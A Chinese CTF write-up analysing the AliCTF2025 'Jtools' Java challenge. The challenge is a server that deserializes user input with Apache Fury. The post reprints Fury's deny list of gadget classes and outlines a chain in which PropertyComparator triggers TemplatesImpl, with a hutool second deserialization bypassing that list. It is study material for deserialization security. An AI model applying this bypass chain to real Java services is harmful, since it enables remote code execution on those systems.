---
title: AliCTF2025-Jtools
date: 2026-05-13T14:51:46+08:00
lastmod: 2026-05-16T00:51:46+08:00
summary: 又学到一种二次反序列化的新东西
url: /posts/Java题目之AliCTF2025-Jtools/
categories:
  - javasec
tags:
  - javasec
draft: false
---
# 题目信息&附件

```html
Java Tools
```

附件地址：https://2025.aliyunctf.com/challenges/63419885803334306

或者直接访问https://2025.aliyunctf.com/api/competitions/58191148862144785/challenges/63419885803334306/attachments:download 就可以下载了

# 源码分析

题目不是Spring Boot项目而是Fat Jar，里面的依赖没有一个集中的存放目录比如BOOT-INF下的lib，而是全部都反编译成源码存放在里面，所以直接在IDEA新建一个项目->新建文件夹lib->将附件jar导入其中->右键jar->添加为库

![](image/Pasted%20image%2020260513160200.png)

看到主类是com.app.Server

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.app;

import cn.hutool.http.ContentType;
import cn.hutool.http.HttpUtil;
import com.feilong.io.IOReaderUtil;
import java.util.Base64;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

public class Server {
    public Server() {
    }

    public static void main(String[] args) {
        HttpUtil.createServer(8888).addAction("/", (request, response) -> {
            String data = request.getParam("data");
            String result = "";
            if (data == null) {
                response.write(IOReaderUtil.readToString("/tmp/desc.txt"), ContentType.TEXT_PLAIN.toString());
            }

            try {
                Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
                Object deserialize = fury.deserialize(Base64.getDecoder().decode(data));
                result = deserialize.toString();
            } catch (Exception e) {
                result = e.getMessage();
            }

            response.write(result, ContentType.TEXT_PLAIN.toString());
        }).start();
    }
}

```

调用hutool的HTTP工具类启动了8888端口并接收一个data字段，如果没有传 data 参数，就返回
/tmp/desc.txt 的内容，如果存在就进入try语句

```java
            try {
                Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
                Object deserialize = fury.deserialize(Base64.getDecoder().decode(data));
                result = deserialize.toString();
            } catch (Exception e) {
                result = e.getMessage();
            }

            response.write(result, ContentType.TEXT_PLAIN.toString());
```

先是注册了一个Fury反序列化器，requireClassRegistration(false) 表示不强制要求类预注册

然后把 data 这个字符串做 Base64 解码并交给Fury反序列化成Java对象，最后将result打印输出

先学一下fury序列化和反序列化的机制吧

# fury序列化和反序列化

## 什么是Fury？

Apache Fury是一个由 JIT 动态编译和零拷贝技术驱动的多语言序列化框架，实现了 Java、
Python、Golang、JavaScript、Rust、C++ 等多语言 SDK，支持自动的跨语言对象序列化，在性能上比JDK序列化要快得多

## fury的序列化

fury提供了一种不同于jdk原生序列化的方式，被序列化的类不需要实现序列化的接口，直接就可以序列化

举个例子

写个序列化的类

```java
package com.ctf.AliCTF2025_Jtools;  
  
import java.io.Serializable;  
  
public class User implements Serializable {  
    private String username;  
    private boolean isAdmin;  
  
    public User() {}  
      
    public User(String username, boolean isAdmin) {  
        this.username = username;  
        this.isAdmin = isAdmin;  
    }  
  
    public String getUsername() {  
        return username;  
    }  
  
    public void setUsername(String username) {  
        this.username = username;  
    }  
  
    public boolean isAdmin() {  
        return isAdmin;  
    }  
  
    public void setAdmin(boolean admin) {  
        isAdmin = admin;  
    }  
  
    @Override  
    public String toString() {  
        return "User{" +  
                "username='" + username + '\'' +  
                ", isAdmin=" + isAdmin +  
                '}';  
    }  
}
```

然后写一个序列化类

```java
package com.ctf.AliCTF2025_Jtools;  
  
import org.apache.fury.Fury;  
import org.apache.fury.config.Language;  
  
public class SerializeClass {  
    public static void main(String[] args) {  
        Fury fury = Fury.builder().withLanguage(Language.JAVA).build();  
        User user = new User("wanth3f1ag",true);  
        fury.register(User.class);  
        byte[] bytes = fury.serialize(user);  
        System.out.println(fury.deserialize(bytes));  
    }  
}
```

![](image/Pasted%20image%2020260513224731.png)

需要注意的是，​ fury序列化对象的时候序列化的类需要使用register注册，或者设置requireClassRegistration为false，否则序列化的时候会抛出错误

关于fury.builder的配置选项，官方给出了以下配置：

| 选项名                                 | 说明                                                                                                                                                                                                                                                                                              | 默认值                                                |
| ----------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| `timeRefIgnored`                    | 是否忽略所有在 `TimeSerializers` 注册的时间类型及其子类的引用跟踪（当引用跟踪开启时）。如需对时间类型启用引用跟踪，可通过 `Fory#registerSerializer(Class, Serializer)` 注册。例如：`fory.registerSerializer(Date.class, new DateSerializer(fory, true))`。注意，启用引用跟踪需在包含时间字段的类型代码生成前完成，否则这些字段仍会跳过引用跟踪。                                                     | `true`                                             |
| `compressInt`                       | 是否启用 int 压缩以减小序列化体积。                                                                                                                                                                                                                                                                            | `true`                                             |
| `compressLong`                      | 是否启用 long 压缩以减小序列化体积。                                                                                                                                                                                                                                                                           | `true`                                             |
| `compressString`                    | 是否启用字符串压缩以减小序列化体积。                                                                                                                                                                                                                                                                              | `false`                                            |
| `classLoader`                       | 类加载器不建议动态变更，Fory 会缓存类元数据。如需变更类加载器，请使用 `LoaderBinding` 或 `ThreadSafeFory`。                                                                                                                                                                                                                       | `Thread.currentThread().getContextClassLoader()`   |
| `compatibleMode`                    | 类型前向/后向兼容性配置。与 `checkClassVersion` 配置相关。`SCHEMA_CONSISTENT`：序列化端与反序列化端类结构需一致。`COMPATIBLE`：序列化端与反序列化端类结构可不同，可独立增删字段。[详见](https://fory.apache.org/zh-CN/docs/guide/java_object_graph_guide/#%e7%b1%bb%e7%bb%93%e6%9e%84%e4%b8%8d%e4%b8%80%e8%87%b4%e4%b8%8e%e7%89%88%e6%9c%ac%e6%a0%a1%e9%aa%8c)。 | `CompatibleMode.SCHEMA_CONSISTENT`                 |
| `checkClassVersion`                 | 是否校验类结构一致性。启用后，Fory 会写入并校验 `classVersionHash`。若启用 `CompatibleMode#COMPATIBLE`，此项会自动关闭。除非能确保类不会演化，否则不建议关闭。                                                                                                                                                                                       | `false`                                            |
| `checkJdkClassSerializable`         | 是否校验 `java.*` 下的类实现了 `Serializable` 接口。若未实现，Fory 会抛出 `UnsupportedOperationException`。                                                                                                                                                                                                           | `true`                                             |
| `registerGuavaTypes`                | 是否预注册 Guava 类型（如 `RegularImmutableMap`/`RegularImmutableList`）。这些类型虽非公开 API，但较为稳定。                                                                                                                                                                                                              | `true`                                             |
| `requireClassRegistration`          | 关闭后可反序列化未知类型，灵活性更高，但存在安全风险。                                                                                                                                                                                                                                                                     | `true`                                             |
| `suppressClassRegistrationWarnings` | 是否屏蔽类注册警告。警告可用于安全审计，但可能影响体验，默认开启屏蔽。                                                                                                                                                                                                                                                             | `true`                                             |
| `metaShareEnabled`                  | 是否启用元数据共享模式。                                                                                                                                                                                                                                                                                    | `true`（若设置了 `CompatibleMode.Compatible`，否则为 false） |
| `scopedMetaShareEnabled`            | 是否启用单次序列化范围内的元数据独享。该元数据仅在本次序列化中有效，不与其他序列化共享。                                                                                                                                                                                                                                                    | `true`（若设置了 `CompatibleMode.Compatible`，否则为 false） |
| `metaCompressor`                    | 设置元数据压缩器。默认使用基于 `Deflater` 的 `DeflaterMetaCompressor`，可自定义如 `zstd` 等更高压缩比的压缩器。需保证线程安全。                                                                                                                                                                                                          | `DeflaterMetaCompressor`                           |
| `deserializeNonexistentClass`       | 是否允许反序列化/跳过不存在的类的数据。                                                                                                                                                                                                                                                                            | `true`（若设置了 `CompatibleMode.Compatible`，否则为 false） |
| `codeGenEnabled`                    | 是否启用代码生成。关闭后首次序列化更快，但后续序列化性能较低。                                                                                                                                                                                                                                                                 | `true`                                             |
| `asyncCompilationEnabled`           | 是否启用异步编译。启用后，序列化先用解释模式，JIT 完成后切换为 JIT 模式。                                                                                                                                                                                                                                                       | `false`                                            |
| `scalaOptimizationEnabled`          | 是否启用 Scala 特定优化。                                                                                                                                                                                                                                                                                | `false`                                            |
| `copyRef`                           | 关闭后，深拷贝性能更好，但会忽略循环和共享引用。对象图中的同一引用会被拷贝为不同对象。                                                                                                                                                                                                                                                     | `true`                                             |
| `serializeEnumByName`               | 启用后，枚举按名称序列化，否则按 ordinal。                                                                                                                                                                                                                                                                       | `false`                                            |

另外还需要注意，开启requireClassRegistration配置和register注册序列化类的下序列化出来的东西是不一样的，在后面反序列化的时候也会走不一样的流程

```java
package com.ctf.AliCTF2025_Jtools;  
  
import org.apache.fury.Fury;  
import org.apache.fury.config.Language;  
  
import java.util.Base64;  
  
public class SerializeClass {  
    public static void main(String[] args) {  
  
        //手动注册序列化类  
        Fury fury1 = Fury.builder()  
                .withLanguage(Language.JAVA)  
                .requireClassRegistration(true)  
                .build();  
        User user1 = new User("wanth3f1ag",true);  
        fury1.register(User.class);  
        byte[] bytes1 = fury1.serialize(user1);  
        String b64_1 = Base64.getEncoder().encodeToString(bytes1);  
  
        System.out.println(b64_1);  
        System.out.println(fury1.deserialize(bytes1).toString());  
  
        //设置requireClassRegistration为false  
        Fury fury2 = Fury.builder()  
                .withLanguage(Language.JAVA)  
                .requireClassRegistration(false)  
                .build();  
        User user2 = new User("wanth3f1ag",false);  
        byte[] bytes2 = fury2.serialize(user2);  
        String b64_2 = Base64.getEncoder().encodeToString(bytes2);  
  
        System.out.println(b64_2);  
        System.out.println(fury2.deserialize(bytes2).toString());  
    }  
}
```

输出结果如下：

```java
Av/EAgEAKHdhbnRoM2YxYWc=
User{username='wanth3f1ag', isAdmin=true}

Av9NAhvuUxgTuK0EcZ8EmL80WQ5a/tptz/GmccWkBgNSRIgBACh3YW50aDNmMWFn
User{username='wanth3f1ag', isAdmin=true}
```

## fury的反序列化

![](image/Pasted%20image%2020260513225402.png)

不难看出如果使用了requireClassRegistration来禁用手动类注册的话，就会出现不可控的情况

然后我们来调试一下两种反序列化的流程

首先是需要类注册（requireClassRegistration\=\=true）的情况

```java
package com.ctf.AliCTF2025_Jtools;  
  
import org.apache.fury.Fury;  
import org.apache.fury.config.Language;  
  
public class Unserial_with_register {  
    public static void main(String[] args) {  
        Fury fury1 = Fury.builder()  
                .withLanguage(Language.JAVA)  
                .requireClassRegistration(true)  
                .build();  
        User user1 = new User("wanth3f1ag",true);  
        fury1.register(User.class);  
        byte[] bytes1 = fury1.serialize(user1);  
        fury1.deserialize(bytes1);  
    }  
}
```

断点打在deserialize函数上，进行调试

函数调用栈：

```java
readClassInfo:1657, ClassResolver (org.apache.fury.resolver)
readRef:861, Fury (org.apache.fury)
deserialize:793, Fury (org.apache.fury)
deserialize:714, Fury (org.apache.fury)
main:15, Unserial_with_register (com.ctf.AliCTF2025_Jtools)
```

来到readClassInfo()函数

```java
public ClassInfo readClassInfo(MemoryBuffer buffer) {  
    if (this.metaContextShareEnabled) {  
        return this.readClassInfoWithMetaShare(buffer, this.fury.getSerializationContext().getMetaContext());  
    } else {  
        int header = buffer.readVarUint32Small14();  
        ClassInfo classInfo;  
        if ((header & 1) != 0) {  
            classInfo = this.readClassInfoFromBytes(buffer, this.classInfoCache, header);  
            this.classInfoCache = classInfo;  
        } else {  
            classInfo = this.getOrUpdateClassInfo((short)(header >> 1));  
        }  
  
        this.currentReadClass = classInfo.cls;  
        return classInfo;  
    }  
}
```

![](image/Pasted%20image%2020260513231303.png)

会先从缓冲区读一个头信息，这里读出来的 header 不是单纯的类 ID，而是一个**带标志位的值**。

然后会用最低位判断类信息的存储方式

![](image/Pasted%20image%2020260513231603.png)

简单来说，如果关闭了类注册就会走上面第一个流程，因为序列化的对象不是预先注册了的，否则就会走第二个流程

当前会进入getOrUpdateClassInfo函数，跟进看看

```java
private ClassInfo getOrUpdateClassInfo(short classId) {  
    ClassInfo classInfo = this.classInfoCache;  
    if (classInfo.classId != classId) {  
        classInfo = this.registeredId2ClassInfo[classId];  
        if (classInfo.serializer == null) {  
            this.addSerializer(classInfo.cls, this.createSerializer(classInfo.cls));  
            classInfo = (ClassInfo)this.classInfoMap.get(classInfo.cls);  
        }  
  
        this.classInfoCache = classInfo;  
    }  
  
    return classInfo;  
}
```

会检测是否有serializer序列号接口，没有就**懒加载给他创建一个**

有一个小tips，跟进createSerializer函数

![](image/Pasted%20image%2020260513233812.png)

createSerializer方法里面调用了DisallowedList.checkNotInDisallowedList

```java
static void checkNotInDisallowedList(String clsName) {  
    for(String disallowed : DEFAULT_DISALLOWED_LIST_SET) {  
        if (clsName.contains(disallowed)) {  
            throw new InsecureException(String.format("%s hit disallowed list", clsName));  
        }  
    }  
  
}
```

判断是否在黑名单之内，如果在黑名单之内则报错，黑名单来自于 fury/disallowed.txt 文件

![](image/Pasted%20image%2020260513233943.png)

后面就没啥流程了

然后我们接着看关闭了类注册（requireClassRegistration\=\=false）的情况

```java
package com.ctf.AliCTF2025_Jtools;  
  
import org.apache.fury.Fury;  
import org.apache.fury.config.Language;  
  
public class Unserial_without_register {  
    public static void main(String[] args) {  
        Fury fury2 = Fury.builder()  
                .withLanguage(Language.JAVA)  
                .requireClassRegistration(false)  
                .build();  
        User user2 = new User("wanth3f1ag",true);  
        byte[] bytes1 = fury2.serialize(user2);  
        fury2.deserialize(bytes1);  
    }  
}
```

也是来到readClassInfo()函数，不过是进入了第一个流程

```java
private ClassInfo readClassInfoFromBytes(MemoryBuffer buffer, ClassInfo classInfoCache, int header) {  
    MetaStringBytes simpleClassNameBytesCache = classInfoCache.classNameBytes; //取出缓存中的类名字节 
    MetaStringBytes packageBytes;  
    MetaStringBytes simpleClassNameBytes;  
    if (simpleClassNameBytesCache != null) {  //看缓存中有没有类可以复用
        MetaStringBytes packageNameBytesCache = classInfoCache.packageNameBytes;  
        packageBytes = this.metaStringResolver.readMetaStringBytesWithFlag(buffer, packageNameBytesCache, header);  //读包名字节
  
        assert packageNameBytesCache != null;  
  
        simpleClassNameBytes = this.metaStringResolver.readMetaStringBytes(buffer, simpleClassNameBytesCache);  //读类名字节
        if (simpleClassNameBytesCache.hashCode == simpleClassNameBytes.hashCode && packageNameBytesCache.hashCode == packageBytes.hashCode) {  //判断是否和缓存的一致
            return classInfoCache;  //如果一直就直接返回
        }  
    } else {  //否则就正常读取包名和类名
        packageBytes = this.metaStringResolver.readMetaStringBytesWithFlag(buffer, header);  
        simpleClassNameBytes = this.metaStringResolver.readMetaStringBytes(buffer);  
    }  
  
    ClassInfo classInfo = this.loadBytesToClassInfo(packageBytes, simpleClassNameBytes);  
    return classInfo.serializer == null ? this.getClassInfo(classInfo.cls) : classInfo;  
}
```

这里直接return classInfoCache了，回来后调用了readDataInternal方法，对传入的字节流进行递归还原

```java
private Object readDataInternal(MemoryBuffer buffer, ClassInfo classInfo) {  
    switch (classInfo.getClassId()) {  
        case 14:  
            return buffer.readBoolean();  
        case 15:  
            return buffer.readByte();  
        case 16:  
            return buffer.readChar();  
        case 17:  
            return buffer.readInt16();  
        case 18:  
            if (this.compressInt) {  
                return buffer.readVarInt32();  
            }  
  
            return buffer.readInt32();  
        case 19:  
            return buffer.readFloat32();  
        case 20:  
            return LongSerializer.readInt64(buffer, this.longEncoding);  
        case 21:  
            return buffer.readFloat64();  
        case 22:  
            return this.stringSerializer.readJavaString(buffer);  
        default:  
            ++this.depth;  
            Object read = classInfo.getSerializer().read(buffer);  
            --this.depth;  
            return read;  
    }  
}
```

会调用无参构造函数

![](image/Pasted%20image%2020260513234643.png)

到这里Fury的序列化和反序列化调试就结束了，我们进入正题

# 回到题目

解题思路主要是尝试从 feilong 和 hutool 等第三方依赖中寻找新的 gadget ，或者借助二次反序列化进行 Bypass

先看看黑名单

```java
bsh.Interpreter  
bsh.XThis  
ch.qos.logback.core.db.DriverManagerConnectionSource  
ch.qos.logback.core.db.JNDIConnectionSource  
clojure.core  
clojure.main  
com.caucho.config.types.ResourceRef  
com.caucho.hessian.test.TestCons  
com.caucho.naming.QName  
com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.Base64Data  
com.ibm.xltxe.rnm1.xtq.bcel.util.ClassLoader  
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase  
com.mchange.v2.c3p0.JndiRefForwardingDataSource  
com.mchange.v2.c3p0.WrapperConnectionPoolDataSource  
com.mysql.cj.jdbc.MysqlConnectionPoolDataSource  
com.mysql.cj.jdbc.MysqlDataSource  
com.mysql.cj.jdbc.MysqlXADataSource  
com.mysql.jdbc.jdbc2.optional.MysqlDataSource  
com.mysql.jdbc.util.ServerController  
com.rometools.rome.feed.impl.EqualsBean  
com.rometools.rome.feed.impl.ToStringBean  
com.sun.corba.se.impl.activation.ServerManagerImpl  
com.sun.corba.se.impl.activation.ServerTableEntry  
com.sun.corba.se.impl.presentation.rmi.InvocationHandlerFactoryImpl.CustomCompositeInvocationHandlerImpl  
com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl  
com.sun.corba.se.spi.orbutil.proxy.LinkedInvocationHandler  
com.sun.jndi.ldap.LdapAttribute  
com.sun.jndi.rmi.registry.BindingEnumeration  
com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl  
com.sun.org.apache.bcel.internal.util.ClassLoader  
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl  
com.sun.org.apache.xpath.internal.objects.XString  
com.sun.org.apache.xpath.internal.XPathContext  
com.sun.rowset.JdbcRowSetImpl  
com.sun.syndication.feed.impl.EqualsBean  
com.sun.syndication.feed.impl.ObjectBean  
com.sun.syndication.feed.impl.ToStringBean  
com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data  
com.zaxxer.hikari.HikariConfig  
com.zaxxer.hikari.HikariDataSource  
groovy.lang.PropertyValue  
groovy.util.MapEntry  
java.beans.EventHandler  
java.beans.Expression  
java.lang.invoke.InvokeDynamic  
java.lang.invoke.MethodHandles.Lookup  
java.lang.MethodHandle  
java.lang.Process  
java.lang.ProcessBuilder  
java.lang.reflect.Constructor  
java.lang.reflect.Field  
java.lang.reflect.Method  
java.lang.Runtime  
java.lang.Shutdown  
java.lang.System  
java.lang.Thread  
java.lang.ThreadGroup  
java.lang.ThreadLocal  
java.lang.UNIXProcess  
java.lang.VarHandler  
java.net.Socket  
java.rmi.registry.Registry  
java.rmi.server.ObjID  
java.rmi.server.RemoteObjectInvocationHandler  
java.rmi.server.UnicastRemoteObject  
java.security.SignedObject  
java.util.ServiceLoader  
javassist.bytecode.annotation.Annotation  
javassist.bytecode.annotation.AnnotationImpl  
javassist.bytecode.annotation.AnnotationMemberValue  
javassist.tools.web.Viewer  
javassist.util.proxy.SerializedProxy  
javax.activation.MimeTypeParameterList  
javax.imageio.ImageIO  
javax.imageio.spi.ServiceRegistry  
javax.management.BadAttributeValueExpException  
javax.management.ImmutableDescriptor  
javax.management.MBeanServerInvocationHandler  
javax.management.openmbean.CompositeDataInvocationHandler  
javax.media.jai.remote.SerializableRenderedImage  
javax.naming.InitialContext  
javax.naming.ldap.Rdn  
javax.naming.spi.ContinuationContext.getEnvironment  
javax.naming.spi.ContinuationContext.getTargetContext  
javax.naming.spi.ObjectFactory  
javax.script.ScriptEngineManager  
javax.sound.sampled.AudioFileFormat  
javax.sound.sampled.AudioFormat  
javax.swing.UIDefaults  
javax.xml.transform.Templates  
net.bytebuddy.dynamic.loading.ByteArrayClassLoader  
oracle.jdbc.connector.OracleManagedConnectionFactory  
oracle.jdbc.pool.OracleDataSource  
org.apache.activemq.ActiveMQConnectionFactory  
org.apache.activemq.ActiveMQXAConnectionFactory  
org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory  
org.apache.bcel.util.ClassLoader  
org.apache.carbondata.core.scan.expression.ExpressionResult  
org.apache.commons.beanutils.BeanComparator  
org.apache.commons.beanutils.BeanToPropertyValueTransformer  
org.apache.commons.codec.binary.Base64  
org.apache.commons.collections.functors.ChainedTransformer  
org.apache.commons.collections.functors.ConstantTransformer  
org.apache.commons.collections.functors.InstantiateTransformer  
org.apache.commons.collections.functors.InvokerTransformer  
org.apache.commons.collections.Transformer  
org.apache.commons.collections4.comparators.TransformingComparator  
org.apache.commons.collections4.functors.ChainedTransformer  
org.apache.commons.collections4.functors.ConstantTransformer  
org.apache.commons.collections4.functors.InstantiateTransformer  
org.apache.commons.collections4.functors.InvokerTransformer  
org.apache.commons.configuration.JNDIConfiguration  
org.apache.commons.configuration2.JNDIConfiguration  
org.apache.commons.dbcp.datasources.PerUserPoolDataSource  
org.apache.commons.dbcp.datasources.SharedPoolDataSource  
org.apache.commons.dbcp2.datasources.PerUserPoolDataSource  
org.apache.commons.dbcp2.datasources.SharedPoolDataSource  
org.apache.commons.fileupload.disk.DiskFileItem  
org.apache.ibatis.executor.loader.AbstractSerialStateHolder  
org.apache.ibatis.executor.loader.cglib.CglibProxyFactory  
org.apache.ibatis.executor.loader.CglibSerialStateHolder  
org.apache.ibatis.executor.loader.javassist.JavassistSerialStateHolder  
org.apache.ibatis.executor.loader.JavassistSerialStateHolder  
org.apache.ibatis.javassist.bytecode.annotation.Annotation  
org.apache.ibatis.javassist.bytecode.annotation.AnnotationImpl  
org.apache.ibatis.javassist.bytecode.annotation.AnnotationMemberValue  
org.apache.ibatis.javassist.tools.web.Viewer  
org.apache.ibatis.javassist.util.proxy.SerializedProxy  
org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup  
org.apache.log.output.db.DefaultDataSource  
org.apache.log4j.receivers.db.DriverManagerConnectionSource  
org.apache.myfaces.context.servlet.FacesContextImpl  
org.apache.myfaces.context.servlet.FacesContextImplBase  
org.apache.myfaces.el.CompositeELResolver  
org.apache.myfaces.el.unified.FacesELContext  
org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression  
org.apache.openjpa.ee.JNDIManagedRuntime  
org.apache.openjpa.ee.RegistryManagedRuntime  
org.apache.shiro.jndi.JndiObjectFactory  
org.apache.shiro.realm.jndi.JndiRealmFactory  
org.apache.tomcat.dbcp.dbcp.BasicDataSource  
org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource  
org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource  
org.apache.tomcat.dbcp.dbcp2.BasicDataSource  
org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource  
org.apache.velocity.runtime.resource.ContentResource  
org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader  
org.apache.velocity.runtime.resource.Resource  
org.apache.velocity.Template  
org.apache.wicket.util.upload.DiskFileItem  
org.apache.xalan.xsltc.trax.TemplatesImpl  
org.apache.xbean.naming.context.ContextUtil  
org.apache.xpath.XPathContext  
org.apache.zookeeper.Shell  
org.aspectj.apache.bcel.util.ClassLoader  
org.bouncycastle.asn1.ASN1Object  
org.bouncycastle.asn1.x509.X509Extensions  
org.codehaus.groovy.runtime.ConvertedClosure  
org.codehaus.groovy.runtime.GStringImpl  
org.codehaus.groovy.runtime.MethodClosure  
org.datanucleus.store.rdbms.datasource.dbcp.datasources.PerUserPoolDataSource;  
org.datanucleus.store.rdbms.datasource.dbcp.datasources.SharedPoolDataSource;  
org.eclipse.jetty.util.log.LoggerLog  
org.geotools.filter.ConstantExpression  
org.h2.value.ValueJavaObject  
org.h2.message.Trace  
org.h2.message.TraceObject  
org.h2.message.TraceSystem  
org.h2.message.TraceWriterAdapter  
org.h2.jdbcx.JdbcDataSource  
org.hibernate.engine.spi.TypedValue  
org.hibernate.tuple.component.AbstractComponentTuplizer  
org.hibernate.tuple.component.PojoComponentTuplizer  
org.hibernate.type.AbstractType  
org.hibernate.type.ComponentType  
org.hibernate.type.Type  
org.jboss.ejb3.proxy.handle.HomeHandleImpl  
org.jboss.ejb3.stateful.StatefulHandleImpl  
org.jboss.ejb3.stateless.StatelessHandleImpl  
org.jboss.interceptor.builder.InterceptionModelBuilder  
org.jboss.interceptor.builder.MethodReference  
org.jboss.interceptor.proxy.DefaultInvocationContextFactory  
org.jboss.interceptor.proxy.InterceptorMethodHandler  
org.jboss.interceptor.reader.ClassMetadataInterceptorReference  
org.jboss.interceptor.reader.DefaultMethodMetadata  
org.jboss.interceptor.reader.ReflectiveClassMetadata  
org.jboss.interceptor.reader.SimpleInterceptorMetadata  
org.jboss.interceptor.spi.instance.InterceptorInstantiator  
org.jboss.interceptor.spi.metadata.InterceptorReference  
org.jboss.interceptor.spi.metadata.MethodMetadata  
org.jboss.interceptor.spi.model.InterceptionModel  
org.jboss.interceptor.spi.model.InterceptionType  
org.jboss.proxy.ejb.handle.EntityHandleImpl  
org.jboss.proxy.ejb.handle.HomeHandleImpl  
org.jboss.proxy.ejb.handle.StatefulHandleImpl  
org.jboss.proxy.ejb.handle.StatelessHandleImpl  
org.jboss.resteasy.plugins.server.resourcefactory.JndiResourceFactory  
org.jboss.weld.interceptor.builder.InterceptionModelBuilder  
org.jboss.weld.interceptor.builder.MethodReference  
org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory  
org.jboss.weld.interceptor.proxy.InterceptorMethodHandler  
org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference  
org.jboss.weld.interceptor.reader.DefaultMethodMetadata  
org.jboss.weld.interceptor.reader.ReflectiveClassMetadata  
org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata  
org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator  
org.jboss.weld.interceptor.spi.metadata.InterceptorReference  
org.jboss.weld.interceptor.spi.metadata.MethodMetadata  
org.jboss.weld.interceptor.spi.model.InterceptionModel  
org.jboss.weld.interceptor.spi.model.InterceptionType  
org.mockito.internal.creation.cglib.AcrossJVMSerializationFeature  
org.mortbay.log.Slf4jLog  
org.mozilla.javascript.Context  
org.mozilla.javascript.IdScriptableObject  
org.mozilla.javascript.MemberBox  
org.mozilla.javascript.NativeError  
org.mozilla.javascript.NativeJavaMethod  
org.mozilla.javascript.NativeJavaObject  
org.mozilla.javascript.NativeObject  
org.mozilla.javascript.ScriptableObject  
org.python.core.PyBytecode  
org.python.core.PyFunction  
org.python.core.PyObject  
org.quartz.utils.JNDIConnectionProvider  
org.reflections.Reflections  
org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator  
org.springframework.aop.framework.AdvisedSupport  
org.springframework.aop.framework.JdkDynamicAopProxy  
org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor  
org.springframework.aop.target.SingletonTargetSource  
org.springframework.beans.BeanWrapperImpl  
org.springframework.beans.factory.BeanFactory  
org.springframework.beans.factory.config.MethodInvokingFactoryBean  
org.springframework.beans.factory.config.PropertyPathFactoryBean  
org.springframework.beans.factory.ObjectFactory  
org.springframework.beans.factory.support.DefaultListableBeanFactory  
org.springframework.core.SerializableTypeWrapper  
org.springframework.expression.spel.ast.Indexer  
org.springframework.expression.spel.ast.MethodReference  
org.springframework.jndi.JndiObjectTargetSource  
org.springframework.jndi.support.SimpleJndiBeanFactory  
org.springframework.orm.jpa.AbstractEntityManagerFactoryBean  
org.springframework.transaction.jta.JtaTransactionManager  
org.thymeleaf.standard.expression.Expression  
org.thymeleaf.standard.expression.StandardExpressionParser  
org.yaml.snakeyaml.tokens.DirectiveToken  
pstore.shaded.org.apache.commons.collections.functors.InvokerTransformer  
sun.print  
sun.print.UnixPrintService  
sun.print.UnixPrintServiceLookup  
sun.rmi.server.UnicastRef  
sun.rmi.server.UnicastRef2  
sun.rmi.transport.LiveRef  
sun.rmi.transport.tcp.TCPEndpoint  
sun.swing.SwingLazyValue  
weblogic.ejb20.internal.LocalHomeHandleImpl  
weblogic.jms.common.ObjectMessageImpl  
com.atomikos.icatch.jta.RemoteClientUserTransaction  
com.feilong.lib
```

当前fury版本是0.9.0，对比一下官方黑名单多了com.feilong.lib和sun.print

## 链子分析


[官方wp](https://xz.aliyun.com/news/17029)中给出了一个gadget

```html
通过审计发现com.feilong.core.util.comparator.PropertyComparator的compare方法可以触发getter调用，然后利用动态代理触发MapProxy的invoke，到达BeanConverter的jdk二次反序列化点绕过黑名单
```

看到com.feilong.core.util.comparator.PropertyComparator#compare 方法

```java
public int compare(T t1, T t2) {  
    if (t1 == t2) {  
        return 0;  
    } else if (null == t1) {  
        return 1;  
    } else if (null == t2) {  
        return -1;  
    } else {  
        Comparable propertyValue1 = (Comparable)PropertyUtil.getProperty(t1, this.propertyName);  
        Comparable propertyValue2 = (Comparable)PropertyUtil.getProperty(t2, this.propertyName);  
        if (null != this.propertyValueConvertToClass) {  
            propertyValue1 = (Comparable)ConvertUtil.convert(propertyValue1, this.propertyValueConvertToClass);  
            propertyValue2 = (Comparable)ConvertUtil.convert(propertyValue2, this.propertyValueConvertToClass);  
        }  
  
        return null == this.comparator ? this.compare(t1, t2, propertyValue1, propertyValue2) : this.comparator.compare(propertyValue1, propertyValue2);  
    }  
}
```

和CB链的BeanComparator.compare()大差不差，如果t1设置为一个`TemplatesImpl`对象，而 propertyName 的值为 outputProperties 时，将会自动调用getter，也就是`TemplatesImpl#getOutputProperties()`方法，可以触发类加载

但是TemplatesImpl在黑名单中，需要打二次反序列化去绕过，本题使用的是 BeanConverter 的二次反序列化

## 二次反序列化

### cn.hutool.core.io.IoUtil#readObj

先看到cn.hutool.core.io.IoUtil#readObj

![](image/Pasted%20image%2020260514001500.png)

先调用accept将clazz添加到白名单中，随后调用readobject方法，ValidateObjectInputStream重载了resolveClass 函数，会触发调用

![](image/Pasted%20image%2020260514001606.png)

存在一定的过滤

### cn.hutool.core.util.ObjectUtil#deserialize()

然后找找cn.hutool.core.io.IoUtil#readObj的调用，找到cn.hutool.core.util.ObjectUtil#deserialize()

```java
public static <T> T deserialize(byte[] bytes, Class<?>... acceptClasses) {  
    try {  
        return (T)IoUtil.readObj(new ValidateObjectInputStream(new ByteArrayInputStream(bytes), acceptClasses));  
    } catch (IOException e) {  
        throw new IORuntimeException(e);  
    }  
}
```

这里clazz参数默认是null，也就没有白名单了，即通过 ObjectUtil#deserialize 反序列化将不会受到黑白名单影响

![](image/Pasted%20image%2020260514002918.png)

